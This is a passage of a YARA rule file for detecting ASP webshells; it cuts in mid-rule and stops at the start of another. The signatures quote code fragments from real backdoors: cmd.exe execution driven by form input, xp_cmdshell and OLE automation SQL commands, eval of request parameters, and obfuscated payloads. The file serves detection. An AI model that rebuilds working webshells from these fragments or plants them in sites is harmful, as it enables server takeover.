        $s3 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
        $s4 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword ascii
        $s5 = "' -- check for a command that we have posted -- '" fullword ascii
        $s6 = "' -- Use a poor man's pipe ... a temp file -- '" fullword ascii
        $s7 = "'  Author:  Maceo <maceo @ dogmile.com>" fullword ascii
        $s8 = "' -- create the COM objects that we will be using -- '" fullword ascii
        $s9 = "<input type=text name=\".CMD\" size=45 value=\"<%= szCMD %>\">" fullword ascii
        $s10 = "Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)" fullword ascii
        $s11 = "<!--    http://michaeldaw.org   2006    -->" fullword ascii
        $s12 = "<FORM action=\"<%= Request.ServerVariables(\"URL\") %>\" method=\"POST\">" fullword ascii
        $s13 = "Set oScript = Server.CreateObject(\"WSCRIPT.SHELL\")" fullword ascii
        $s14 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s15 = "szCMD = Request.Form(\".CMD\")" fullword ascii
        $s16 = "Response.Write Server.HTMLEncode(oFile.ReadAll)" fullword ascii
        $s17 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword ascii
        $s18 = "' -------------------------------------------" fullword ascii
        $s19 = "' --------------------o0o--------------------" fullword ascii
        $s20 = "Dim szCMD, szTempFile" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 4KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule c8b2efc1fd9cb438052bf0f5236748e0456b49b8
{
     meta:
        description = "asp - file c8b2efc1fd9cb438052bf0f5236748e0456b49b8.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "29487c5ba2f6f32848cfaad36301c1034b533e3a7904197878146bd6936a5c55"
     strings:
        $x1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
        $x2 = "HeaderContent = MidB(Binary, PosOpenBoundary + LenB(Boundary) + 2, PosEndOfHeader - PosOpenBoundary - LenB(Boundary) - 2)" fullword ascii
        $x3 = "bFieldContent = MidB(Binary, (PosEndOfHeader + 4), PosCloseBoundary - (PosEndOfHeader + 4) - 2)" fullword ascii
        $s4 = "GetHeadFields BinaryToString(HeaderContent), Content_Disposition, FormFieldName, SourceFileName, Content_Type" fullword ascii
        $s5 = "Content_Disposition = LTrim(SeparateField(Head, \"content-disposition:\", \";\"))" fullword ascii
        $s6 = "<p><input type=\"text\" name=\".CMD\" size=\"45\" value=\"<%= szCMD %>\"> <input type=\"submit\" value=\"Run\"> </p>" fullword ascii
        $s7 = "<b>User</b>: <%= \"\\\\\" & oScriptNet.ComputerName & \" \\ \" & oScriptNet.UserName %> <br>" fullword ascii
        $s8 = "Content_Type = LTrim(SeparateField(Head, \"content-type:\", \";\"))" fullword ascii
        $s9 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
        $s10 = "Function GetHeadFields(ByVal Head, Content_Disposition, Name, FileName, Content_Type)" fullword ascii
        $s11 = "response.write(\"<form name=frmFileAttributes action=ntdaddy.asp method=post>\")" fullword ascii
        $s12 = "response.write(\"<form name=frmFolderAttributes action=ntdaddy.asp method=post>\")" fullword ascii
        $s13 = "<b>HTTPD</b>: <%=request.servervariables(\"SERVER_SOFTWARE\")%> <b>Port</b>: <%=request.servervariables(\"SERVER_PORT\")%> <br>" fullword ascii
        $s14 = "PosEndOfHeader = InStrB(PosOpenBoundary + Len(Boundary), Binary, StringToBinary(vbCrLf + vbCrLf))" fullword ascii
        $s15 = "response.write(\"<form name=lstDrives action=ntdaddy.asp method=post>\")" fullword ascii
        $s16 = "response.write(\"<form name=lstFolders action=ntdaddy.asp method=post>\")" fullword ascii
        $s17 = "response.write(\"<form name=frmTextFile action=ntdaddy.asp method=post>\")" fullword ascii
        $s18 = "response.write(\"File: \" & FilePath & \" Format: \" & tempmsg & \" has been saved.\")" fullword ascii
        $s19 = "<b>User Agent</b>: <%=request.servervariables(\"HTTP_USER_AGENT\")%> <br>" fullword ascii
        $s20 = "response.write(\"<form name=lstFiles action=ntdaddy.asp method=post>\")" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule dd038dd129a420f4659cea9c77e30f3d0a6925b5
{
     meta:
        description = "asp - file dd038dd129a420f4659cea9c77e30f3d0a6925b5.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
     strings:
        $x1 = "STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.EXE /" fullword ascii
        $x2 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Server.Exec\"&\"ute</td><td><font color=red>" fullword ascii
        $x3 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\cmd.exe\")&\"' size='40'>\"" fullword ascii
        $x4 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Exec\"&\"ute</td><td><font color=red>e\"&\"xecute()" fullword ascii
        $x5 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii
        $x6 = "STRQUERY=\"DBCC ADDEXTENDEDPROC ('XP_CMDSHELL','XPLOG70.DLL')\"" fullword ascii
        $s7 = "STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.EXE /C " ascii
        $s8 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
        $s9 = "CMD=CHR(34)&\"CMD.EXE /C \"&REQUEST.FORM(\"CMD\")&\" > 8617.TMP\"&CHR(34)" fullword ascii
        $s10 = "STRQUERY = \"DROP TABLE [JNC];EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\\MICROSOFT\\JET\\4.0\\ENGINES','SANDBOXMOD" ascii
        $s11 = "Report = Report&\"<tr><td height=30>\"&temp&\"</td><td>\"&GetDateCreate(thePath)&\"</td><td>\"&theDate&\"</td></tr>\"" fullword ascii
        $s12 = "erongI.xEger~ ttap=nrettaP.xEger~ pxEgeR weN=xEger teS\":ExeCuTe(UZSS(ShiSan)):End Function " fullword ascii
        $s13 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>\"&GetDateCreate(thePath)&\"</td><td>\"&theDate&\"</td></tr>\"" fullword ascii
        $s14 = "STRQUERY = \"DROP TABLE [JNC];DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL',@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD /" fullword ascii
        $s15 = "STRQUERY = \"EXEC MASTER.DBO.XP_SERVICECONTROL 'START','SQLSERVERAGENT';\"" fullword ascii
        $s16 = "Call ws.Run (ShellPath&\" /c \" & DefCmd & \" > \" & szTempFile, 0, True)" fullword ascii
        $s17 = "ODE','REG_DWORD',1;SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.E" ascii
        $s18 = "\"-HomeDir=c:\\\" & vbCrLf & \"-LoginMesFile=\" & vbCrLf & \"-Disable=0\" & vbCrLf & \"-RelPaths=1\" & vbCrLf & _" fullword ascii
        $s19 = "Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLED" ascii
        $s20 = "Conn.Execute(SqlStr)" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule c2d23126780f20a65082fbb4e5fcc092184a82a9
{
     meta:
        description = "asp - file c2d23126780f20a65082fbb4e5fcc092184a82a9.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ee03d95eedaec69608600dc07b35db774c0182e9e60787c4cda9626e4dc0d513"
     strings:
        $x1 = "Set ijre=zsckm.ExecQuery(\"select * from Win32_Pro\"&ivj&\"cess where ProcessId='\"&pid&\"'\")" fullword ascii
        $x2 = "If jzgm=\"\"Then jzgm=\"cmd.exe /c net user\"" fullword ascii
        $x3 = "Set rrf=zsckm.ExecQuery(\"select * from Win32_NetworkAda\"&dkp&\"pterConfiguration where IPEnabled ='True'\")" fullword ascii
        $x4 = "Set qxau=zsckm.ExecQuery(\"select * from Win3\"&dwt&\"2_Service where Name='\"&dlzu&\"'\")" fullword ascii
        $x5 = "bdyaf=bdyaf&\"<a href='http://www.helpsoff.com.cn' target='_blank'>Fuck Tencent</a>\"" fullword ascii
        $x6 = "bdyaf=bdyaf&\"<a href='http://0kee.com/' target='_blank'>0kee Team</a> | \"" fullword ascii
        $s7 = "zepw\"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\",\"Start Menu->Programs\"" fullword ascii
        $s8 = "On Error Resume Next:Execute nedsl&\".\"&strPam&\".value=rsdx(\"&nedsl&\".\"&strPam&\".value)\"" fullword ascii
        $s9 = "zhv\"com\"&sruz&\"mand execute succeed!Refresh the iframe below to check result.\"" fullword ascii
        $s10 = "Set mgl=blhvq.Execute(str)" fullword ascii
        $s11 = "set ss=zsckm.get(\"Win32_ProcessSta\"&uyy&\"rtup\")" fullword ascii
        $s12 = "zepw\"C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\",\"PcAnywhere\"" fullword ascii
        $s13 = "zepw\"C:\\Documents and Settings\\All Users\\Documents\",\"Documents\"" fullword ascii
        $s14 = "bdyaf=bdyaf&\"<a href='http://www.t00ls.net/' target='_blank'>T00ls</a> | \"" fullword ascii
        $s15 = "bdyaf=bdyaf&\"<a href='http://www.vtwo.cn/' target='_blank'>Bink Team</a> | \"" fullword ascii
        $s16 = "zepw\"C:\\Documents and Settings\\All Users\",\"All Users\"" fullword ascii
        $s17 = "doTd\"<a href=\"\"javascript:adwba('\"&goaction&\"','stopone','\"&cpmvi.ProcessId&\"')\"\">Terminate</a>\",\"\"" fullword ascii
        $s18 = "zepw\"C:\\Program Files\\RhinoSoft.com\",\"RhinoSoft.com\"" fullword ascii
        $s19 = "Set bnes=dtwz(\"wi\"&kcb&\"nmgmts:\\\\.\\ro\"&todxo&\"ot\\default:StdRegP\"&bqlnw&\"rov\")" fullword ascii
        $s20 = "echo\"<div align=right>Processed in :\"&apwc&\"seconds</div></td></tr></table></body></html>\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule a3385cc7d2ccacdecbdc0a7e5f45d9d2bb7129af
{
     meta:
        description = "asp - file a3385cc7d2ccacdecbdc0a7e5f45d9d2bb7129af.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1eae9a1e073c23d9f53a247f77184b3a777e53522eeb93281afbe5ac099199b2"
     strings:
        $s1 = "P',dYMPir~@#@&,+1tGJ98wW.:cKlT+ -mVEn~{P2opE,@#@&,+1tWrl(^RbxU+MCP\\d'JrEJpJP@#@&~+1tKJ94oGM: /!8:bYcbpJP@#@&,+^tKEM+O!D" fullword ascii
        $s2 = "Mumaasp.com" fullword ascii
        $s3 = "\\`tCOm4RjlsEnS,JcJ*~K4+U@#@&dd77\"+2WMO,'~\"+aWDD[r@!YM@*@!Y9@*E'D+:a'J@!zY9@*@!Y9@*;DnlOELJnr(%+1Y@!&DN@*@!O9@*/D" fullword ascii
        $s4 = "dD[E^VcbwaVb^lDkGxr#~b,WD,(xkYDv~Wk^+D6O~~J1ld+vEm^/r[=F&{TOv+! /yGELfKHX~+kO[r,RF8Z3Rzc,ARcWc*lfXcZ!Z!E#~b,Y4+" fullword ascii
        $s5 = "`EsKV[nMnlD4J*#[rwwN(RsN8iBnDP6SA9A=fCOm4ldn,nC/kAKD[{eCeJrir~@#@&Pnm4WEjDD$8DP{PJr9.k7+M'`?5s,?nD7nD)ijnM\\+.xr[j+M-" fullword ascii
        $s6 = "LA6 :+kY`6k^nYXYbP:tnU@#@&di7d\"+wK.OP{P\"+2W.OLJ@!YM@*@!DN@*ELY+h2LJ@!zD[@*@!O9@*c?l7+:GsbVn@!JY[@*@!YN@*" fullword ascii
        $s7 = "P@#@&,PP,ok^+q1GxJ@!0KxOPWC1+xBSrxTNrUT/B~^KVGD{v[N[9N9NB,/b\"+{BfB@* @!&6WxD@*Pr@#@&,~3x9P&0@#@&3U9PoE" fullword ascii
        $s8 = "\"b/~EiDWE$[l*vl 0%y&IOKE;LSiDWE$'.WDlMYdkUrsNCiDGE$[SIDWE5'y\\hk1&DWGMiDWE$[BIYKE5[8R+ RvFc+,8iYK;5[E'" fullword ascii
        $s9 = "=\"http://www.mumaasp.com/\"'" fullword ascii
        $s10 = "^YvJjmMk2Obxocok^+?HdO+sr(LnmOE*@#@&P,~PU+O~6P'~o2?6RVnDsr^+v0k^+aCY4#~@#@&dd~{P0c9lD+ZMnCY" fullword ascii
        $s11 = "@#@&did-C^P',]KMk:v]n;!+kY p;nMXjYMrxT`-CM##@#@&id3x9~&0@#@&diM+DnKdY,'~\\mV@#@&i2x9~s!xmDrGx@#@&wEUmOrKx~fKAxwksnvnlO4*@#@&P,]" fullword ascii
        $s12 = "6lr@#@&idb^nalvb^+ali]d#7@#@&7mm/n~r?+.-!J@#@&i71ls^PU+D7Evb)AD.R;VnCM@#@&i^lk+PrC[Nk+M\\;J@#@&idCN9d+M\\;c*@#@&7^m/nPr/sNqUt" fullword ascii
        $s13 = "3&M_K),4KsNpP$r\"f3] S2wPOqqf:ulP8wXi~s6H:Ojq\\3),F+2XiP$6\"f3I JAsP Z}Sr\"),:!Z%T!Zi~$zZ|V]r`1f=~:!ZcZ!Ti~$}I92\"RA}KP6tO" fullword ascii
        $s14 = "ok^+ )DYDr8!Yn/{fy)n1tKPJ@!/1.kaY~VmxL;mo+{vLm\\lk^.kaYE@*CVn.D`v" fullword ascii
        $s15 = "PxPoC^/n@#@&j+M\\n.c?m.raYPksnKEO{,O,,O,O1,,P~@#@&IndaWxknR~E06n.P{YMEnd@#@&}x~2M.WMP]nkE:n~g+aY@#@&" fullword ascii
        $s16 = "kT4Y{&T!@*@!&r6Dlsn@*,J)\"ndwKxk+ h.rD+~J@!8D@*@!8.@*@!w@*@!(D@*@!a@*@!4.@*@!(D@*@!w@*@!4M@*@!m" fullword ascii
        $s17 = "/,'PM+T36c2a+1EOnv0k^nYXY#@#@&7dwWMP3l^4,HCY14Pbx~\\mYm4nk@#@&di7Dsr^+,'P\"+asl1+cHbNc\\mYm4 .mVE" fullword ascii
        $s18 = ":r'J!J'JsJ'EcJ[rAJLJhr'Ehr[rzE[E&r[E)r'JaJ'EDJ[EOr[Etr'rBELJ{J[rmr'JMJ'JkJ'E,J[rOJLJwr'Ekr[rDE[E^r[E/r'J@!J@#@&A0EUxUY.I" fullword ascii
        $s19 = "6nRTr6R4D:ctYsVcrx1RrxbR%2TRLk VKoRs[8Rsk9Rhwf axLRa4wcDh MlD dS0 YXOchC7RXV/c6ssR.k2RN/2 m/wX ir@#@&,~~Pwk^+PX2n,'~V1C/" fullword ascii
        $s20 = "./BJQJ*)VnHhWM['DDkscV+HhKD[#~l6VCo{rxkY.c0+XAGMNSJ'E*PGMPbx/DDvV+HhGD9~E&r#P=WVmo'6sCo,WMPrxdOM`V+HAWMNSE=J#~l6VCo{W^lL,WMPk" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule f896b713f42668493fa80270fe3135a5f6338b57
{
     meta:
        description = "asp - file f896b713f42668493fa80270fe3135a5f6338b57.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3ad57c8544ad8d05128a0343399b32ce94d916e1445b455e7b6c933d5393871c"
     strings:
        $x1 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c \"&request.form(\"cmd\")).stdout.readall" fullword ascii
        $x2 = "RRS\"Zend: C:\\Program Files\\Zend\\ZendOptimizer-3.3.0\\lib\\Optimizer-3.3.0\\php-5.2.x\\ZendOptimizer.dll  <br>\"" fullword ascii
        $x3 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>AllUsers</a>n#" fullword ascii
        $s4 = "case \"apjdel\":apjdel():case \"Servu7x\":su7():case \"fuzhutq1\":fuzhutq1():case \"fuzhutq2\":fuzhutq2():case \"fuzhutq3\":fuzh" ascii
        $s5 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\a" fullword ascii
        $s6 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\`" fullword ascii
        $s7 = "RRS\"c:\\Documents and Settings\\All Users\\Application Data\\Hagel Technologies\\DU Meter\\log.csv <br>\"" fullword ascii
        $s8 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\error.log <br>\"" fullword ascii
        $s9 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Persist.Dat  <br>\"" fullword ascii
        $s10 = "RRS\"C:\\7i24.com\\iissafe\\log\\startandiischeck.txt  <br>\"" fullword ascii
        $s11 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Validate.dat  <br>\"" fullword ascii
        $s12 = "xPost.Open \"POST\", \"http://127.0.0.1:\"& port &\"/secdst\",True, \"\", \"\"" fullword ascii
        $s13 = "<a href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\\\\system32\\\\config\\\\\"\")'>config</a>WP" fullword ascii
        $s14 = "> <INPUT type=Password name=Pass size=22>&nbsp;<input type=submit value=Login><hr><br>\"&mmshell&\"</div></center>\"" fullword ascii
        $s15 = "<a href='javascript:ShowFolder(\"\"c:\\\\WINDOWS\\\\system32\\\\inetsrv\\\\data\\\\\"\")'>data</a>eF<a href='javascript:ShowFold" ascii
        $s16 = "xPost3.Open \"POST\", \"http://127.0.0.1:\"& port &\"/secdst\", True" fullword ascii
        $s17 = "RRS\"c:\\Program Files\\360\\360Safe\\deepscan\\Section\\mutex.db <br>\"" fullword ascii
        $s18 = "xPost.Send loginuser & loginpass & mt & newdomain & newuser & quit" fullword ascii
        $s19 = ":Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLE" ascii
        $s20 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\Rewrite.log<br>\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule ffe44e9985d381261a6e80f55770833e4b78424b
{
     meta:
        description = "asp - file ffe44e9985d381261a6e80f55770833e4b78424b.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8e2b5e9d0d9f6c70e55c617792caedac979f0d8c6123f90c16afd30a6f7ac9a7"
     strings:
        $x1 = "if ShellPath=\"\" Then ShellPath = \"c:\\\\windows\\\\system32\\\\cmd.exe\"" fullword ascii
        $x2 = "Response.Write(\"Executed #\" & I + 1 & \" Without Error<BR><BR>\")" fullword ascii
        $s3 = "Set Rs = Conn.Execute(\"Select top 1 * from \" & sTable & \"\")" fullword ascii
        $s4 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
        $s5 = "set RS = Conn.Execute(cstr(sQuery),intRecordsAffected)" fullword ascii
        $s6 = "\"<option value=\"\"SELECT GETDATE() AS 'Date and Time', @@CONNECTIONS AS 'Login Attempts',@@SERVERNAME as 'SERVERNAME',@@CPU_BU" ascii
        $s7 = "Conn.Execute \"alter table \" & sTable & \" drop column \" & sField" fullword ascii
        $s8 = "\"  <tr><td class=\"\"menubar\"\"><a target=\"\"mainFrame\"\" href=\"\"?action=cmdshell\"\">DOS" fullword ascii
        $s9 = "set Rs = Conn.execute(\"Select top 1 * from \" & sTable & \"\") " fullword ascii
        $s10 = "Set Rs = Conn.Execute(sSQL)" fullword ascii
        $s11 = "Set RS = Conn.Execute(sSQL)" fullword ascii
        $s12 = "c:\\progra~1\\winrar\\rar.exe a d:\\web\\test\\web1.rar d:\\web\\test\\web1</textarea><br>\"" fullword ascii
        $s13 = "\" <TD ALIGN=\"\"Left\"\" bgcolor=\"\"#FFFFFF\"\"><input type=\"\"checkbox\"\" name=\"\"MultiExec\"\" value=\"\"yes\"\">\" & _" fullword ascii
        $s14 = "Response.Write(\"Executing #\" & I + 1 & \": \" & sSQL(i) & \"<BR>\") " fullword ascii
        $s15 = "\"<option value=\"\"SELECT GETDATE() AS 'Date and Time', @@CONNECTIONS AS 'Login Attempts',@@SERVERNAME as 'SERVERNAME',@@CPU_BU" ascii
        $s16 = "\"<form name=\"\"loginform\"\" action=\"\"?action=login\"\" method=\"\"post\"\">\" & _" fullword ascii
        $s17 = "set rs = Conn.execute(\"EXEC sp_helpfile\")" fullword ascii
        $s18 = "Conn.Execute \"DROP PROCEDURE \" & sSP" fullword ascii
        $s19 = "Conn.Execute \"DROP VIEW \" & sView" fullword ascii
        $s20 = "Conn.Execute \"Drop Table \" & sTable" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule e09a223dbca8186dcbf190735797ee24ae0bea29
{
     meta:
        description = "asp - file e09a223dbca8186dcbf190735797ee24ae0bea29.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "93edf47561807e971ca08b3cabd4d6c427e350d7254f88cd77b3aa3be517678b"
     strings:
        $s1 = "Response.AddHeader \"Content-Disposition\",\"attachment; filename=\" & Request(\"Down\")" fullword ascii
        $s2 = "<a href=http://www.5luyu.cn target=\"\"_blank\"\">http://www.5luyu.cn</a></div>\"" fullword ascii
        $s3 = "Echo \"<input type=password name=PassWord value=\"\"\" & Session(ScriptName) & \"\"\" /></td>\"" fullword ascii
        $s4 = "Echo \"<input size=28 type=text name=FileName value=\"&request.ServerVariables(\"HTTP_HOST\")&\" />&nbsp;&nbsp;\"" fullword ascii
        $s5 = "Echo \"<form id=Frm_Enter name=Frm_Enter method=post action=\"\"\" & ScriptName &\"\"\">\"" fullword ascii
        $s6 = "Echo \"<tr><td height=32><select style=width: 100% name=FileName>\" & GetFileList(\"./\") & \"</select> </td></tr>\"" fullword ascii
        $s7 = "Echo \"<form id=Frm_Pack name=Frm_Pack method=post action=\"\"\" & ScriptName & \"\"\">\"" fullword ascii
        $s8 = "Echo \"<meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\">\"" fullword ascii
        $s9 = "If Trim(Session(ScriptName))=Trim(PassWord) Then" fullword ascii
        $s10 = "If Trim(Session(ScriptName))<>Trim(PassWord) Then" fullword ascii
        $s11 = "Session(ScriptName) = Trim(Request(\"PassWord\"))" fullword ascii
        $s12 = "GetFileList = GetFileList & \"<option value=\"\"\"&fc.Name&\"\"\" >\"&fc.Name&\"</option>\"" fullword ascii
        $s13 = "packname = Year(Now)&Month(Now)&Day(Now)&Hour(Now)&Minute(Now)&Second(Now)&ranNum&\".asp\"&Year(Now)" fullword ascii
        $s14 = "Response.ExpiresAbsolute = Now() - 1" fullword ascii
        $s15 = "GetFileList = GetFileList & \"<option value=\"\"\"\" selected=\"\"selected\"\" >" fullword ascii
        $s16 = "2px; BORDER-LEFT: #cccccc 1px solid; WIDTH: 120px; CURSOR: pointer; COLOR: #000000; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1p" fullword ascii
        $s17 = "BORDER-LEFT: #999999 1px; COLOR: #ffffff; BORDER-BOTTOM: #999999 1px; BACKGROUND-REPEAT: no-repeat; FONT-FAMILY: " fullword ascii
        $s18 = "Server.ScriptTimeout = 999999999 '" fullword ascii
        $s19 = "Response.BinaryWrite objStream.Read(1024*64)" fullword ascii
        $s20 = "')\"\" method=post action=\"\"\"&ScriptName&\"\"\">\"" fullword ascii
     condition:
        ( uint16(0) == 0xbbef and filesize < 80KB and ( 8 of them ) ) or ( all of them )
}

rule sig_4fd3993faed933704bb847b2b2ff79336ce0c656
{
     meta:
        description = "asp - file 4fd3993faed933704bb847b2b2ff79336ce0c656.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7059d529604f169cef50244e01da67f934520b1e02f9a0ccd8b3bffb07f22d18"
     strings:
        $s1 = "<% Set objFSO = Server.CreateObject(\"Scripting.FileSystemObject\") %>" fullword ascii
        $s2 = "<% response.redirect (Request.ServerVariables(\"SCRIPT_NAME\"))%>" fullword ascii
        $s3 = "<% Response.write \"<form action='' method=post>\" %>" fullword ascii
        $s4 = "<% Set objCountFile=objFSO.CreateTextFile(server.mappath(Request.ServerVariables" fullword ascii
        $s5 = "<% Response.write \"<textarea name=cyfddata cols=80 rows=10 width=32></textarea>\" %>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 2KB and ( all of them ) ) or ( all of them )
}

rule cb29432685ce4463ee5c6c186e768ef715d167b6
{
     meta:
        description = "asp - file cb29432685ce4463ee5c6c186e768ef715d167b6.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
     strings:
        $x1 = "j cdx&\"<a href='http://tool.chinaz.com/baidu/?wd=\"&str1&\"&lm=0&pn=0' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x2 = "'j cdx&\"<a href='http://www.8090sec.com/SQL/index.aspx' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $x3 = "j cdx&\"<a href='http://www.114best.com/ip/114.aspx?w=\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x4 = "j cdx&\"<a href='http://www.aizhan.com/siteall/\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x5 = "TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls." fullword ascii
        $s6 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&OOOO&\"' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s7 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s8 = "j cdx&\"<a href='?Action=Logout' target='_top'><font face='wingdings'>8</font> <font color=green>" fullword ascii
        $s9 = "'j cdx&\"<a href='\"&htp&\"sql.asp' target='FileFrame'>\"&cxd&\" MYSQL" fullword ascii
        $s10 = "j cdx&\"<a href='?Action=cmdx' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s11 = "ion='http://www.baidu.com/ips8.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFF" ascii
        $s12 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&request.serverVariables(\"SERVER_NAME\")&\"</td></tr><form method=post" ascii
        $s13 = "j cdx&\"<a href='http://tool.chinaz.com/Tools/Robot.aspx?url=\"&str1&\"&btn=+" fullword ascii
        $s14 = "j cdx&\"<a href='?Action=ProFile' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s15 = "j cdx&\"<a href='?Action=ScanPort' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s16 = "j cdx&\"<a href='?Action=ScanDriveForm' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s17 = "j cdx&\"<a href='?Action=suftp' target='FileFrame'>\"&cxd&\" Su---FTP" fullword ascii
        $s18 = "j cdx&\"<a href='?Action=radmin' target='FileFrame'>\"&cxd&\" Radmin" fullword ascii
        $s19 = "j cdx&\"<a href='?Action=Servu' target='FileFrame'>\"&cxd&\" Servu-" fullword ascii
        $s20 = "j cdx&\"<a href='?Action=MMD' target='FileFrame'>\"&cxd&\" MS--SA" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_120545faff7b15edfbe8dd120de76e10a7057a7a
{
     meta:
        description = "asp - file 120545faff7b15edfbe8dd120de76e10a7057a7a.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0eb9ea3388134dcb99503c95320abeb06f8503165c62c58c5f96fa3d203393a2"
     strings:
        $s1 = "execute(unescape(temp))" fullword ascii
        $s2 = "a=\"eva@@l%20req@@uest%28%22helloxj%22%29\"" fullword ascii
        $s3 = "dim a,b,temp,c" fullword ascii
        $s4 = "temp=temp+c(i)" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_86b04a9d6f9f7b76c4c490d41dfe8b5fd28cff26
{
     meta:
        description = "asp - file 86b04a9d6f9f7b76c4c490d41dfe8b5fd28cff26.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "49b8ad91bbf545ff3b17ce7bd15007c82dbdb76930f3f03a7d3ee919b1cb9e1d"
     strings:
